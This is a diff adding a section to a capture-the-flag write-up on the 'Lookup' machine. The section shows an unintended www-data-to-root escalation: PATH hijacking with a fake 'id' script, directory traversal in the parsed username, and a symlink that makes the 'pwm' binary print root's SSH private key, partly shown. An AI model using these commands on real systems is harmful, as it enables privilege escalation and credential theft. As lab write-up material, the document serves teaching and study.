@@ -477,6 +477,55 @@ root@lookup:~# wc -c root.txt
 33 root.txt
 ```
 
+## Unintended www-data to root
+
+Looking back at how the `/usr/sbin/pwm` binary works, we know that it extracts everything within parentheses for the `uid` field in the output of the `id` command as the username.
+
+After that, it uses the extracted username without any filtering to build the filename to read and prints the contents of it.
+
+So, what we can do is, instead of providing a username like `think` (which builds the filename as `/home/think/.passwords`), we can provide a directory traversal payload as the username to make it read the `.passwords` file from any part of the filesystem. Additionally, we can make this `.passwords` file a symlink to any file we want to read, achieving arbitrary file read.
+
+To exploit this, let's create our `id` executable with a directory traversal payload as the username and modify our `PATH` variable to hijack the actual `id` command, as shown below:
+
+```console
+www-data@lookup:/var/www/html$ echo -e '#!/bin/bash\necho "uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)"' > /var/www/html/id
+www-data@lookup:/var/www/html$ chmod 777 /var/www/html/id
+www-data@lookup:/var/www/html$ export PATH=/var/www/html:$PATH
+www-data@lookup:/var/www/html$ which id
+/var/www/html/id
+www-data@lookup:/var/www/html$ id
+uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)
+```
+{: .wrap }
+
+> We are using `/var/www/html` instead of `/tmp` or `/dev/shm`, because `fs.protected_symlinks` is enabled on the host. This means that any `symlink` created in a world-writable directory like `/tmp` or `/dev/shm` will not be followed. While we could still create the `id` executable in those directories and only put the `symlink` in `/var/www/html`, preparing everything in a single directory is simpler.  
+{: .prompt-tip }
+
+As we can see, now our `id` command outputs:  
+`uid=33(../var/www/html) gid=33(www-data) groups=33(www-data)`,  
+which means that the `/usr/sbin/pwm` binary will extract `../var/www/html` as the username and build the file name as `/home/../var/www/html/.passwords`.
+
+Next, we can create `/home/../var/www/html/.passwords` (`/var/www/html/.passwords`) as a symlink pointing to any file we want to read as `root`. For example, `/root/.ssh/id_rsa` in our case, as follows:
+
+```console
+www-data@lookup:/var/www/html$ ln -s /root/.ssh/id_rsa /var/www/html/.passwords
+www-data@lookup:/var/www/html$ ls -la /var/www/html/.passwords
+lrwxrwxrwx 1 www-data www-data 17 Nov 25 22:53 /var/www/html/.passwords -> /root/.ssh/id_rsa
+```
+
+Finally, running `/usr/sbin/pwm`, we can see it works exactly as we anticipated, extracting the username as `../var/www/html` and printing the contents of `/home/../var/www/html/.passwords`, which is a symlink to `/root/.ssh/id_rsa`. This allows us to obtain the private **SSH** key of the `root` user, which we can then use to gain a shell as `root`.
+
+```console
+www-data@lookup:/var/www/html$ /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: ../var/www/html
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...
+DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
+-----END OPENSSH PRIVATE KEY-----
+```
+
 <style>
 .center img {        
   display:block;
